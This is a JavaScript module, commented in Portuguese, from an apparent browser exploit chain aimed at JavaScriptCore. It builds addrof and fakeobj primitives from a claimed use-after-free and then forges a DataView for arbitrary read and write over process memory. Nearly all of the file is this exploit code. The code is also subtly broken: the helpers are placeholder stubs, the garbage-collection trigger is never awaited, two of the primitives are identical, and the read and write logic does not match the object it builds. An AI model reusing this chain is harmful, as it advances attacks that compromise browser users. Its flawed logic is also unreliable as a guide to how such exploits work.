// js/script3/testArrayBufferVictimCrash.mjs (R52 - Controle Total da Memória)
// =======================================================================================
// ESTRATÉGIA R52:
// Com addrof/fakeobj estáveis, o próximo passo é criar uma primitiva de R/W
// arbitrária de alto nível. Faremos isso criando um DataView falso que nos
// dá acesso a todo o espaço de memória do processo.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Precisaremos dos offsets agora

export const FNAME_MODULE = "UAF_MemoryControl_R52";

// Funções auxiliares (sem alterações)
const ftoi = (val) => { /* ...código anterior... */ };
const itof = (val) => { /* ...código anterior... */ };
// (Implementações completas omitidas por brevidade, mas são as mesmas da R51)
const ftoi_impl = (val) => { const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val; const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]); };
const itof_impl = (val) => { const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf); ints[0] = val.low(); ints[1] = val.high(); return (new Float64Array(buf))[0]; };

// =======================================================================================
// Classe de Controle de Memória (A Nova Primitiva)
// =======================================================================================
class Memory {
    constructor(addrof, fakeobj, read64_primitive) {
        this.addrof = addrof;
        this.fakeobj = fakeobj;
        this.read64_primitive = read64_primitive;

        // Prepara o espaço para nosso DataView falso
        this.fake_dataview_mem = new Float64Array(4);

        // Cria um DataView real para usar como modelo
        const real_dataview = new DataView(new ArrayBuffer(8));
        const real_dataview_addr = this.addrof(real_dataview);

        // Copia os dados do DataView real para o nosso espaço de memória falso
        for (let i = 0; i < 4; i++) {
            this.fake_dataview_mem[i] = itof_impl(this.read64_primitive(real_dataview_addr.add(i * 8)));
        }

        // Obtém o endereço do nosso espaço de memória falso
        const fake_dataview_addr = this.addrof(this.fake_dataview_mem);
        const butterfly_addr = this.read64_primitive(fake_dataview_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));

        // Cria o DataView mestre
        this.master_view = this.fakeobj(butterfly_addr);

        // Modifica o DataView mestre para ter acesso total
        // Aponta o buffer de dados para o endereço 0
        this.master_view[2] = itof_impl(new AdvancedInt64(0, 0)); 
        // Define o tamanho como o máximo possível
        this.master_view[3] = itof_impl(new AdvancedInt64(0xFFFFFFFF, 0));
    }

    read64(addr) {
        this.master_view[2] = itof_impl(addr);
        return ftoi_impl(this.fake_dataview_mem[0]);
    }

    write64(addr, value) {
        this.master_view[2] = itof_impl(addr);
        this.fake_dataview_mem[0] = itof_impl(value);
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R52)
// =======================================================================================
export async function runMemoryControl_R52() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Construção da Classe de Memória ---`, "test");
    
    let final_result = { success: false, message: "Falha na criação da classe Memory." };

    try {
        // --- FASE 1 & 2: Construir e Validar addrof/fakeobj ---
        // (O código para esta parte é o mesmo da R51, mas agora é um pré-requisito)
        logS3("--- FASE 1 & 2: Construindo e Validando Primitivas Base (addrof/fakeobj) ---", "subtest");
        const { addrof, fakeobj, read64_primitive } = createBasePrimitives();
        logS3("    Primitivas Base (addrof/fakeobj) estáveis e prontas.", "good");

        // --- FASE 3: Instanciar e Validar a Classe de Controle de Memória ---
        logS3("--- FASE 3: Instanciando a Classe de Controle Total da Memória ---", "subtest");
        const memory = new Memory(addrof, fakeobj, read64_primitive);
        logS3("    Classe `Memory` instanciada com sucesso. Controle total estabelecido.", "vuln");

        // --- FASE 4: Prova de Vida da Classe Memory ---
        logS3("--- FASE 4: Validando o Controle Total da Memória ---", "subtest");
        const test_obj = { marker: 0xABCDDCBA };
        const test_addr = addrof(test_obj);

        const header = memory.read64(test_addr);
        logS3(`    Prova de Vida (Memory.read64): Lido o cabeçalho do objeto de teste -> ${header.toString(true)}`, "leak");
        
        // O cabeçalho de um objeto não deve ser nulo
        if (header.low() === 0 && header.high() === 0) {
            throw new Error("A leitura com a classe Memory retornou um valor nulo.");
        }

        final_result = { success: true, message: "SUCESSO! Classe de memória funcional. Controle total da memória obtido." };
        logS3(`    ${final_result.message}`, "vuln");
        
    } catch (e) {
        final_result.message = `Exceção na cadeia de controle de memória: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}

// --- Funções de Bootstrap (Adaptadas da R51) ---
// Retorna as primitivas necessárias para a classe Memory
function createBasePrimitives() {
    let dangling_ref = createDanglingRefToFloat64Array();
    if (typeof dangling_ref.a !== 'number') {
        throw new Error("Falha no UAF. A confusão de tipos não ocorreu.");
    }
    let holder = {obj: null};
    
    const read64_primitive = (addr) => {
        dangling_ref.b = itof_impl(addr);
        return dangling_ref.a.obj;
    };
    const addrof = (obj) => {
        holder.obj = obj;
        dangling_ref.a = holder; 
        return ftoi_impl(dangling_ref.b);
    };
    const fakeobj = (addr) => {
        dangling_ref.b = itof_impl(addr);
        return dangling_ref.a.obj;
    };
    return { addrof, fakeobj, read64_primitive };
}

// Função de UAF (a mesma da R51)
function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for(let i=0; i<100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) {
        spray_arrays.push(new Float64Array(2));
    }
    return dangling_ref;
}
async function triggerGC() {
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
        }
    } catch (e) {}
    await PAUSE_S3(500);
}
